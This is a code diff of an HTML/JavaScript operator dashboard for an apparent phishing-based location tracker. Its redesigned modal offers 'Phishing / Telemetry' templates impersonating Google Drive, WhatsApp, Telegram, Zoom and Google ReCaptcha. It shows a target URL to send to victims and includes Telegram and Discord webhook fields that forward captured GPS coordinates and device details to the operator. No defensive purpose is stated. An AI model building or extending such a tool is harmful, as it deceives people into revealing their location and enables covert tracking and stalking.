@@ -621,220 +621,275 @@
   </main>
 
   <!-- Tracker Control & Template Launcher Modal -->
-  <div id="trackerModal" class="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md hidden flex items-center justify-center p-3 sm:p-4">
-    <div class="bg-surface-900 border border-slate-700/80 rounded-2xl max-w-lg w-full max-h-[92vh] flex flex-col overflow-hidden shadow-2xl">
+  <!-- Tracker Control & Template Launcher Modal (Wide, Beautiful & Highly Usable) -->
+  <div id="trackerModal" class="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md hidden flex items-center justify-center p-3 sm:p-6 overflow-y-auto">
+    <div class="bg-surface-900 border border-slate-700/90 rounded-2xl max-w-4xl w-full max-h-[92vh] flex flex-col overflow-hidden shadow-2xl relative">
       
+      <!-- Top Colored Accent Gradient Bar -->
+      <div class="h-1.5 w-full bg-gradient-to-r from-cyan-500 via-emerald-400 to-indigo-500 shrink-0"></div>
+
       <!-- Modal Header -->
-      <div class="p-5 border-b border-slate-800 bg-surface-850 flex items-center justify-between shrink-0">
-        <div class="flex items-center space-x-3">
-          <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-cyan-600 via-cyan-500 to-emerald-400 flex items-center justify-center text-white shadow-md">
+      <div class="px-6 py-4.5 border-b border-slate-800 bg-surface-850 flex items-center justify-between shrink-0">
+        <div class="flex items-center space-x-3.5">
+          <div class="w-10 h-10 rounded-xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 shadow-md">
             <i data-lucide="radar" class="w-5 h-5"></i>
           </div>
           <div>
-            <h3 class="font-bold text-base text-slate-100">Tracker Engine Supervisor</h3>
-            <p class="text-xs text-slate-400">Launch and configure location tracking engine</p>
+            <div class="flex items-center space-x-2">
+              <h3 class="font-bold text-base text-slate-100">Tracker Engine Supervisor</h3>
+              <span class="text-[10px] font-mono font-bold px-2.5 py-0.5 rounded-full bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">Recon Engine v1.3</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-0.5">Select a template, customize phishing parameters, and launch the telemetry engine</p>
           </div>
         </div>
-        <button onclick="closeTrackerModal()" class="text-slate-400 hover:text-white p-2 rounded-xl hover:bg-surface-700 transition">
+        <button onclick="closeTrackerModal()" class="text-slate-400 hover:text-white p-2 rounded-xl hover:bg-surface-700 transition" title="Close (Esc)">
           <i data-lucide="x" class="w-5 h-5"></i>
         </button>
       </div>
 
-      <!-- Modal Body -->
-      <div class="p-5 sm:p-6 space-y-5 overflow-y-auto flex-1 text-xs">
+      <!-- Modal Body (Spacious & Scrollable) -->
+      <div class="p-6 space-y-6 overflow-y-auto flex-1 text-xs">
         
-        <!-- Live Status Card -->
-        <div class="p-4 bg-surface-950 rounded-2xl border border-slate-800 space-y-3">
-          <div class="flex items-center justify-between">
-            <span class="text-slate-400 font-semibold uppercase tracking-wider text-[10px]">Tracker Engine Status</span>
-            <div id="modalTrackerStatePill" class="flex items-center space-x-1.5 px-2.5 py-0.5 rounded-full font-mono text-[11px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">
-              <span id="modalTrackerDot" class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+        <!-- Live Status & Target Link Row -->
+        <div class="p-4 bg-surface-950 rounded-2xl border border-slate-800 flex flex-col md:flex-row items-stretch md:items-center justify-between gap-4">
+          <!-- Left: Engine Indicators -->
+          <div class="flex items-center flex-wrap gap-2.5">
+            <div id="modalTrackerStatePill" class="flex items-center space-x-2 px-3 py-1.5 rounded-xl font-mono text-xs font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">
+              <span id="modalTrackerDot" class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span>
               <span id="modalTrackerStatus">ONLINE</span>
             </div>
-          </div>
-          
-          <div class="grid grid-cols-2 gap-2 text-[11px] font-mono">
-            <div class="bg-surface-900 p-2.5 rounded-xl border border-slate-800/80">
-              <span class="text-slate-500 block text-[10px]">Active Template</span>
-              <span id="modalActiveTemplate" class="text-slate-200 font-bold truncate block">NearYou</span>
+            <div class="flex items-center space-x-2 text-xs font-mono bg-surface-900 border border-slate-800 px-3 py-1.5 rounded-xl">
+              <span class="text-slate-500">Active Template:</span>
+              <span id="modalActiveTemplate" class="text-slate-200 font-bold">NearYou</span>
             </div>
-            <div class="bg-surface-900 p-2.5 rounded-xl border border-slate-800/80">
-              <span class="text-slate-500 block text-[10px]">Target Port</span>
+            <div class="flex items-center space-x-1.5 text-xs font-mono bg-surface-900 border border-slate-800 px-3 py-1.5 rounded-xl">
+              <span class="text-slate-500">Port:</span>
               <span id="modalActivePort" class="text-cyan-400 font-bold">:8080</span>
             </div>
           </div>
 
-          <!-- Active Link Box -->
-          <div id="modalActiveLinkBox" class="p-3 bg-surface-900 rounded-xl border border-cyan-500/30 flex items-center justify-between gap-2">
-            <div class="min-w-0 flex-1">
-              <span class="text-[10px] text-slate-500 block mb-0.5">Target URL (Open on the laptop you want to track):</span>
-              <a id="modalTargetUrlLink" href="http://localhost:8080" target="_blank" class="font-mono text-cyan-400 font-bold truncate block hover:underline text-xs">
-                http://localhost:8080
+          <!-- Right: Active Link Box with Direct Copy -->
+          <div id="modalActiveLinkBox" class="flex items-center bg-surface-900 border border-cyan-500/30 rounded-xl px-3 py-1.5 gap-2 max-w-full justify-between">
+            <div class="min-w-0 pr-2">
+              <span class="text-[10px] text-slate-500 block">Target URL (Send to target):</span>
+              <a id="modalTargetUrlLink" href="https://seeker.riocut.com" target="_blank" class="font-mono text-cyan-400 font-bold truncate block hover:underline text-xs max-w-[260px] sm:max-w-[340px]">
+                https://seeker.riocut.com
               </a>
             </div>
             <div class="flex items-center space-x-1.5 shrink-0">
-              <button onclick="copyTargetLink()" title="Copy Link" class="p-2 rounded-lg bg-surface-800 hover:bg-surface-700 text-slate-200 transition">
-                <i data-lucide="copy" class="w-4 h-4"></i>
+              <button onclick="copyTargetLink()" title="Copy Link" class="p-2 rounded-lg bg-surface-800 hover:bg-surface-700 text-slate-200 transition flex items-center space-x-1">
+                <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                <span class="text-[10px] font-semibold hidden sm:inline">Copy</span>
               </button>
-              <a id="modalTargetUrlExternal" href="http://localhost:8080" target="_blank" title="Open Link" class="p-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white transition">
-                <i data-lucide="external-link" class="w-4 h-4"></i>
+              <a id="modalTargetUrlExternal" href="https://seeker.riocut.com" target="_blank" title="Test in new tab" class="p-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white transition">
+                <i data-lucide="external-link" class="w-3.5 h-3.5"></i>
               </a>
             </div>
           </div>
         </div>
 
-        <!-- Launch / Configure Section -->
-        <div class="space-y-3">
-          <h4 class="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center space-x-1.5">
-            <i data-lucide="sliders" class="w-4 h-4 text-cyan-400"></i>
-            <span>Engine Configuration & Parameters</span>
-          </h4>
+        <!-- Template Selector Section -->
+        <div>
+          <div class="flex items-center justify-between mb-3">
+            <div class="flex items-center space-x-2">
+              <i data-lucide="layout-grid" class="w-4 h-4 text-cyan-400"></i>
+              <h4 class="text-xs font-bold text-slate-200 uppercase tracking-wider">Choose Phishing / Telemetry Template</h4>
+            </div>
+            <span class="text-[11px] text-emerald-400 font-mono font-bold bg-emerald-500/10 px-2.5 py-0.5 rounded-full border border-emerald-500/20">
+              ⚡ 1-Click Launch Ready
+            </span>
+          </div>
 
-          <div class="space-y-3 bg-surface-950 p-4 rounded-2xl border border-slate-800">
-            <!-- Visual Template Selection Cards -->
-            <div>
-              <div class="flex items-center justify-between mb-2">
-                <label class="block text-slate-300 font-medium">Select Template (Click one)</label>
-                <span class="text-[10px] text-emerald-400 font-mono font-bold bg-emerald-500/10 px-2 py-0.5 rounded-full border border-emerald-500/20">1-Click Ready</span>
+          <!-- 8 Template Cards (4 columns on md, 2 on sm) -->
+          <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+            <!-- 0: NearYou -->
+            <button type="button" onclick="selectTemplateCard(0)" id="tplCard-0" class="template-card p-3.5 rounded-xl border border-cyan-500 bg-cyan-500/15 text-left transition-all flex flex-col justify-between hover:border-cyan-400 cursor-pointer shadow-sm relative group ring-2 ring-cyan-500/30">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">🌦️</span>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 font-bold border border-emerald-500/30">Top Pick</span>
               </div>
-              <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-2">
-                <button type="button" onclick="selectTemplateCard(0)" id="tplCard-0" class="template-card p-2.5 rounded-xl border border-cyan-500 bg-cyan-500/10 text-left transition flex flex-col justify-between hover:border-cyan-400 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">🌦️</span>
-                    <span class="font-bold text-[11px] text-slate-100 truncate">NearYou</span>
-                  </div>
-                  <span class="text-[9px] text-emerald-400 font-bold">Recommended</span>
-                </button>
-                <button type="button" onclick="selectTemplateCard(1)" id="tplCard-1" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">📁</span>
-                    <span class="font-bold text-[11px] text-slate-200 truncate">GDrive</span>
-                  </div>
-                  <span class="text-[9px] text-slate-500">File Share</span>
-                </button>
-                <button type="button" onclick="selectTemplateCard(2)" id="tplCard-2" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">💬</span>
-                    <span class="font-bold text-[11px] text-slate-200 truncate">WhatsApp</span>
-                  </div>
-                  <span class="text-[9px] text-slate-500">Group Chat</span>
-                </button>
-                <button type="button" onclick="selectTemplateCard(3)" id="tplCard-3" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">🔗</span>
-                    <span class="font-bold text-[11px] text-slate-200 truncate">WA Redirect</span>
-                  </div>
-                  <span class="text-[9px] text-slate-500">Auto Forward</span>
-                </button>
-                <button type="button" onclick="selectTemplateCard(4)" id="tplCard-4" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">✈️</span>
-                    <span class="font-bold text-[11px] text-slate-200 truncate">Telegram</span>
-                  </div>
-                  <span class="text-[9px] text-slate-500">Channel Invite</span>
-                </button>
-                <button type="button" onclick="selectTemplateCard(5)" id="tplCard-5" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">📹</span>
-                    <span class="font-bold text-[11px] text-slate-200 truncate">Zoom</span>
-                  </div>
-                  <span class="text-[9px] text-slate-500">Video Call</span>
-                </button>
-                <button type="button" onclick="selectTemplateCard(6)" id="tplCard-6" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">🛡️</span>
-                    <span class="font-bold text-[11px] text-slate-200 truncate">ReCaptcha</span>
-                  </div>
-                  <span class="text-[9px] text-slate-500">Human Verify</span>
-                </button>
-                <button type="button" onclick="selectTemplateCard(7)" id="tplCard-7" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
-                  <div class="flex items-center space-x-1.5 mb-1">
-                    <span class="text-base">🌐</span>
-                    <span class="font-bold text-[11px] text-slate-200 truncate">Social OG</span>
-                  </div>
-                  <span class="text-[9px] text-slate-500">Custom Card</span>
-                </button>
+              <div>
+                <span class="font-bold text-xs text-slate-100 block">NearYou</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Nearby Weather & Places</span>
               </div>
-              <select id="modalTemplateSelect" onchange="onTemplateChange()" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500 hidden">
-                <option value="0" selected>🌦️ [0] NearYou - Weather & Nearby Places (Recommended)</option>
-                <option value="1">📁 [1] Google Drive - File Download Share</option>
-                <option value="2">💬 [2] WhatsApp - Group Chat Invite</option>
-                <option value="3">🔗 [3] WhatsApp Redirect - Group Invite with Redirect</option>
-                <option value="4">✈️ [4] Telegram - Channel / Group Invite</option>
-                <option value="5">📹 [5] Zoom - Video Meeting Conference</option>
-                <option value="6">🛡️ [6] Google ReCaptcha - Security Verification</option>
-                <option value="7">🌐 [7] Custom Link Preview - OpenGraph Social Card</option>
-              </select>
+            </button>
+
+            <!-- 1: GDrive -->
+            <button type="button" onclick="selectTemplateCard(1)" id="tplCard-1" class="template-card p-3.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition-all flex flex-col justify-between hover:border-slate-600 cursor-pointer shadow-sm relative group">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">📁</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-surface-800 text-slate-400">File Share</span>
+              </div>
+              <div>
+                <span class="font-bold text-xs text-slate-200 block">Google Drive</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Cloud File Download</span>
+              </div>
+            </button>
+
+            <!-- 2: WhatsApp -->
+            <button type="button" onclick="selectTemplateCard(2)" id="tplCard-2" class="template-card p-3.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition-all flex flex-col justify-between hover:border-slate-600 cursor-pointer shadow-sm relative group">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">💬</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">Chat</span>
+              </div>
+              <div>
+                <span class="font-bold text-xs text-slate-200 block">WhatsApp</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Group Invite Card</span>
+              </div>
+            </button>
+
+            <!-- 3: WA Redirect -->
+            <button type="button" onclick="selectTemplateCard(3)" id="tplCard-3" class="template-card p-3.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition-all flex flex-col justify-between hover:border-slate-600 cursor-pointer shadow-sm relative group">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">🔗</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">Forward</span>
+              </div>
+              <div>
+                <span class="font-bold text-xs text-slate-200 block">WA Redirect</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Invite + Auto Forward</span>
+              </div>
+            </button>
+
+            <!-- 4: Telegram -->
+            <button type="button" onclick="selectTemplateCard(4)" id="tplCard-4" class="template-card p-3.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition-all flex flex-col justify-between hover:border-slate-600 cursor-pointer shadow-sm relative group">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">✈️</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-400 border border-blue-500/20">Community</span>
+              </div>
+              <div>
+                <span class="font-bold text-xs text-slate-200 block">Telegram</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Channel / Group Invite</span>
+              </div>
+            </button>
+
+            <!-- 5: Zoom -->
+            <button type="button" onclick="selectTemplateCard(5)" id="tplCard-5" class="template-card p-3.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition-all flex flex-col justify-between hover:border-slate-600 cursor-pointer shadow-sm relative group">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">📹</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Meeting</span>
+              </div>
+              <div>
+                <span class="font-bold text-xs text-slate-200 block">Zoom</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Video Conference Room</span>
+              </div>
+            </button>
+
+            <!-- 6: ReCaptcha -->
+            <button type="button" onclick="selectTemplateCard(6)" id="tplCard-6" class="template-card p-3.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition-all flex flex-col justify-between hover:border-slate-600 cursor-pointer shadow-sm relative group">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">🛡️</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20">Security</span>
+              </div>
+              <div>
+                <span class="font-bold text-xs text-slate-200 block">Google ReCaptcha</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Human Verification Check</span>
+              </div>
+            </button>
+
+            <!-- 7: Custom OG -->
+            <button type="button" onclick="selectTemplateCard(7)" id="tplCard-7" class="template-card p-3.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition-all flex flex-col justify-between hover:border-slate-600 cursor-pointer shadow-sm relative group">
+              <div class="flex items-center justify-between w-full mb-2">
+                <span class="text-2xl">🌐</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-pink-500/10 text-pink-400 border border-pink-500/20">Social OG</span>
+              </div>
+              <div>
+                <span class="font-bold text-xs text-slate-200 block">Custom OG Card</span>
+                <span class="text-[10px] text-slate-400 block mt-0.5">Rich Social Media Preview</span>
+              </div>
+            </button>
+          </div>
+
+          <select id="modalTemplateSelect" onchange="onTemplateChange()" class="hidden">
+            <option value="0" selected>NearYou</option>
+            <option value="1">Google Drive</option>
+            <option value="2">WhatsApp</option>
+            <option value="3">WhatsApp Redirect</option>
+            <option value="4">Telegram</option>
+            <option value="5">Zoom</option>
+            <option value="6">Google ReCaptcha</option>
+            <option value="7">Custom Link Preview</option>
+          </select>
+        </div>
+
+        <!-- Template Parameters Configuration Area -->
+        <div id="templateConfigWrapper" class="bg-surface-950 p-5 rounded-2xl border border-slate-800 space-y-4">
+          <div class="flex items-center justify-between border-b border-slate-800/80 pb-3">
+            <div class="flex items-center space-x-2">
+              <i data-lucide="sliders" class="w-4 h-4 text-cyan-400"></i>
+              <h4 class="text-xs font-bold text-slate-200 uppercase tracking-wider">Template Customization & Target Options</h4>
+            </div>
+            <div class="flex items-center space-x-2">
+              <label class="text-[11px] text-slate-400 font-medium">Server Port:</label>
+              <input type="number" id="modalPortInput" value="8080" class="w-20 bg-surface-900 border border-slate-700 rounded-lg px-2.5 py-1 text-cyan-400 text-xs font-mono font-bold focus:outline-none focus:border-cyan-500" placeholder="8080" />
+            </div>
+          </div>
+
+          <!-- Dynamic Template Parameter Inputs -->
+          <div id="dynamicTemplateInputs">
+            <!-- Injected dynamically based on template selection -->
+          </div>
+        </div>
+
+        <!-- Notification & Telemetry Integrations Accordion -->
+        <div class="bg-surface-950 rounded-2xl border border-slate-800 overflow-hidden">
+          <button type="button" onclick="toggleIntegrations()" class="w-full flex items-center justify-between text-left text-xs font-semibold text-slate-400 hover:text-slate-200 transition p-4">
+            <span class="flex items-center space-x-2">
+              <i data-lucide="bell-ring" class="w-4 h-4 text-cyan-400"></i>
+              <span class="font-bold text-slate-300">Alerts & Integrations (Telegram / Discord Webhook)</span>
+              <span class="text-[10px] text-slate-500 font-normal hidden sm:inline">(Optional alerts on GPS capture)</span>
+            </span>
+            <i id="integrationsChevron" data-lucide="chevron-down" class="w-4 h-4 transition-transform duration-200"></i>
+          </button>
+
+          <div id="integrationsBox" class="p-4 pt-0 space-y-3 hidden border-t border-slate-800/60">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 pt-3">
+              <div>
+                <label class="block text-slate-300 text-[11px] font-medium mb-1">Telegram Bot Alert (token:chatId)</label>
+                <input type="text" id="modalTelegramInput" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs font-mono focus:outline-none focus:border-cyan-500" placeholder="123456:ABC-DEF:789012" />
+                <span class="text-[10px] text-slate-500 mt-0.5 block">Format: <code>token:chatId</code> (Instant GPS alert sent to your bot)</span>
+              </div>
+
+              <div>
+                <label class="block text-slate-300 text-[11px] font-medium mb-1">Discord / Slack Webhook URL</label>
+                <input type="text" id="modalWebhookInput" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs font-mono focus:outline-none focus:border-cyan-500" placeholder="https://discord.com/api/webhooks/..." />
+                <span class="text-[10px] text-slate-500 mt-0.5 block">Sends rich embeds with device recon and coordinates</span>
+              </div>
             </div>
 
-            <!-- Server Port -->
-            <div>
-              <label class="block text-slate-300 font-medium mb-1">Target Server Port</label>
-              <input type="number" id="modalPortInput" value="8080" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs font-mono focus:outline-none focus:border-cyan-500" placeholder="8080" />
-            </div>
-
-            <!-- Dynamic Template Parameter Inputs -->
-            <div id="dynamicTemplateInputs" class="space-y-2.5 pt-1 hidden">
-              <!-- Injected dynamically based on template selection -->
-            </div>
-
-            <!-- Notification & Telemetry Integrations Accordion -->
-            <div class="pt-2 border-t border-slate-800/80">
-              <button type="button" onclick="toggleIntegrations()" class="w-full flex items-center justify-between text-left text-xs font-semibold text-slate-400 hover:text-slate-200 transition py-1">
-                <span class="flex items-center space-x-1.5">
-                  <i data-lucide="bell-ring" class="w-3.5 h-3.5 text-cyan-400"></i>
-                  <span>Alerts & Notification Integrations (Optional)</span>
-                </span>
-                <i id="integrationsChevron" data-lucide="chevron-down" class="w-4 h-4 transition-transform duration-200"></i>
-              </button>
-
-              <div id="integrationsBox" class="space-y-2.5 pt-2 hidden">
-                <div>
-                  <label class="block text-slate-400 text-[11px] font-medium mb-1">Telegram Bot Alert (token:chatId)</label>
-                  <input type="text" id="modalTelegramInput" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-1.5 text-slate-200 text-xs font-mono focus:outline-none focus:border-cyan-500" placeholder="123456:ABC-DEF:789012" />
-                  <span class="text-[10px] text-slate-500">Format: <code>token:chatId</code> (Instant GPS alert sent to your Telegram)</span>
-                </div>
-
-                <div>
-                  <label class="block text-slate-400 text-[11px] font-medium mb-1">Discord / Slack Webhook URL</label>
-                  <input type="text" id="modalWebhookInput" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-1.5 text-slate-200 text-xs font-mono focus:outline-none focus:border-cyan-500" placeholder="https://discord.com/api/webhooks/..." />
-                  <span class="text-[10px] text-slate-500">Posts rich JSON embed alerts with location & device recon</span>
-                </div>
-
-                <div class="grid grid-cols-2 gap-2">
-                  <div>
-                    <label class="block text-slate-400 text-[11px] font-medium mb-1">KML Export Filename</label>
-                    <input type="text" id="modalKmlInput" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-1.5 text-slate-200 text-xs font-mono focus:outline-none focus:border-cyan-500" placeholder="targets.kml" />
-                  </div>
-                  <div class="flex items-center pt-5">
-                    <label class="flex items-center space-x-2 text-slate-300 cursor-pointer">
-                      <input type="checkbox" id="modalDebugHttp" checked class="rounded border-slate-700 bg-surface-900 text-cyan-500 focus:ring-0" />
-                      <span class="text-[11px]">Debug HTTP (Proxies)</span>
-                    </label>
-                  </div>
-                </div>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
+              <div>
+                <label class="block text-slate-300 text-[11px] font-medium mb-1">KML Export Filename</label>
+                <input type="text" id="modalKmlInput" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs font-mono focus:outline-none focus:border-cyan-500" placeholder="targets.kml" />
+              </div>
+              <div class="flex items-center pt-5">
+                <label class="flex items-center space-x-2 text-slate-300 cursor-pointer">
+                  <input type="checkbox" id="modalDebugHttp" checked class="rounded border-slate-700 bg-surface-900 text-cyan-500 focus:ring-0" />
+                  <span class="text-[11px] font-medium">Debug HTTP (Strip HTTPS force redirect for reverse proxies)</span>
+                </label>
               </div>
             </div>
           </div>
         </div>
 
-        <!-- Console Runtime Output -->
-        <div class="space-y-1.5 pt-1">
-          <div class="flex items-center justify-between text-slate-500 text-[10px] font-mono">
-            <span class="flex items-center space-x-1">
+        <!-- Live Runtime Console -->
+        <div class="space-y-2">
+          <div class="flex items-center justify-between text-slate-400 text-[11px] font-mono">
+            <span class="flex items-center space-x-1.5 font-bold">
               <i data-lucide="terminal" class="w-3.5 h-3.5 text-cyan-400"></i>
-              <span>Live Runtime Console</span>
+              <span>Live Service Runtime Console</span>
             </span>
             <div class="flex items-center space-x-2">
-              <button onclick="fetchTrackerLogs()" title="Refresh Logs" class="hover:text-slate-300 transition">
+              <button onclick="fetchTrackerLogs()" title="Refresh Logs" class="hover:text-cyan-400 transition flex items-center space-x-1">
                 <i data-lucide="refresh-cw" class="w-3 h-3"></i>
+                <span class="text-[10px]">Refresh</span>
               </button>
-              <button onclick="clearTrackerLogsUI()" title="Clear Console" class="hover:text-rose-400 transition">
+              <button onclick="clearTrackerLogsUI()" title="Clear Console" class="hover:text-rose-400 transition flex items-center space-x-1">
                 <i data-lucide="trash-2" class="w-3 h-3"></i>
+                <span class="text-[10px]">Clear</span>
               </button>
             </div>
           </div>
-          <div id="modalTerminalBox" class="bg-surface-950 p-3 rounded-xl border border-slate-800 font-mono text-[11px] text-slate-400 max-h-36 overflow-y-auto space-y-0.5">
+          <div id="modalTerminalBox" class="bg-surface-950 p-3.5 rounded-xl border border-slate-800 font-mono text-[11px] text-slate-400 max-h-36 overflow-y-auto space-y-0.5">
             <p class="text-slate-500">Service logs will appear here...</p>
           </div>
         </div>
@@ -842,16 +897,17 @@
       </div>
 
       <!-- Modal Sticky Footer (Always Visible Without Scrolling) -->
-      <div class="p-4 border-t border-slate-800 bg-surface-950 flex items-center justify-between gap-3 shrink-0">
-        <button onclick="closeTrackerModal()" class="px-4 py-2.5 rounded-xl text-xs font-semibold bg-surface-800 hover:bg-surface-700 text-slate-300 transition">
-          Close
+      <div class="p-4 sm:px-6 border-t border-slate-800 bg-surface-950 flex flex-col sm:flex-row items-center justify-between gap-3 shrink-0">
+        <button onclick="closeTrackerModal()" class="w-full sm:w-auto px-5 py-2.5 rounded-xl text-xs font-semibold bg-surface-800 hover:bg-surface-700 text-slate-300 transition flex items-center justify-center space-x-1.5">
+          <span>Close Manager</span>
         </button>
-        <div class="flex items-center space-x-2">
-          <button id="modalStopBtn" onclick="stopTrackerFromUI()" class="py-2.5 px-4 bg-rose-600/90 hover:bg-rose-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-1.5 shadow-md shadow-rose-600/20">
+
+        <div class="flex items-center space-x-2.5 w-full sm:w-auto justify-end">
+          <button id="modalStopBtn" onclick="stopTrackerFromUI()" class="flex-1 sm:flex-initial py-2.5 px-5 bg-rose-600/90 hover:bg-rose-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-1.5 shadow-md shadow-rose-600/20">
             <i data-lucide="square" class="w-3.5 h-3.5"></i>
             <span>Stop Tracker</span>
           </button>
-          <button id="modalStartBtn" onclick="startTrackerFromUI()" class="py-2.5 px-5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-2 shadow-lg shadow-emerald-600/30">
+          <button id="modalStartBtn" onclick="startTrackerFromUI()" class="flex-1 sm:flex-initial py-2.5 px-6 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-2 shadow-lg shadow-emerald-600/30">
             <i data-lucide="play" class="w-4 h-4"></i>
             <span id="modalStartBtnText">🚀 Launch Tracker</span>
           </button>
@@ -2379,43 +2435,90 @@
       }
     };
 
+    // Live real-time update for Social Card Preview thumbnail
+    window.updateOGPreview = function() {
+      const siteEl = document.getElementById('paramSitename');
+      const titleEl = document.getElementById('paramTitle');
+      const descEl = document.getElementById('paramDesc');
+      const imgEl = document.getElementById('paramImage');
+
+      const sitePrev = document.getElementById('ogPreviewSite');
+      const titlePrev = document.getElementById('ogPreviewTitle');
+      const descPrev = document.getElementById('ogPreviewDesc');
+      const imgPrev = document.getElementById('ogPreviewImg');
+
+      if (sitePrev && siteEl) sitePrev.textContent = siteEl.value.trim() || 'Cloud Storage';
+      if (titlePrev && titleEl) titlePrev.textContent = titleEl.value.trim() || 'Shared Document';
+      if (descPrev && descEl) descPrev.textContent = descEl.value.trim() || 'Click to view the attached file.';
+      if (imgPrev && imgEl) {
+        const val = imgEl.value.trim();
+        if (val.startsWith('http')) {
+          imgPrev.src = val;
+        }
+      }
+    };
+
     // Dynamic template parameters handling
     window.onTemplateChange = function(cfg = null) {
       const val = parseInt(document.getElementById('modalTemplateSelect').value, 10);
       const container = document.getElementById('dynamicTemplateInputs');
       const activeCfg = cfg || (trackerState && trackerState.config) || {};
 
-      // Sync active visual card styling
+      // Sync active visual card styling (cyan glow & ring)
       document.querySelectorAll('.template-card').forEach(c => {
-        c.classList.remove('border-cyan-500', 'bg-cyan-500/10');
+        c.classList.remove('border-cyan-500', 'bg-cyan-500/15', 'ring-2', 'ring-cyan-500/30');
         c.classList.add('border-slate-750', 'bg-surface-900');
       });
       const activeCard = document.getElementById(`tplCard-${val}`);
       if (activeCard) {
-        activeCard.classList.add('border-cyan-500', 'bg-cyan-500/10');
+        activeCard.classList.add('border-cyan-500', 'bg-cyan-500/15', 'ring-2', 'ring-cyan-500/30');
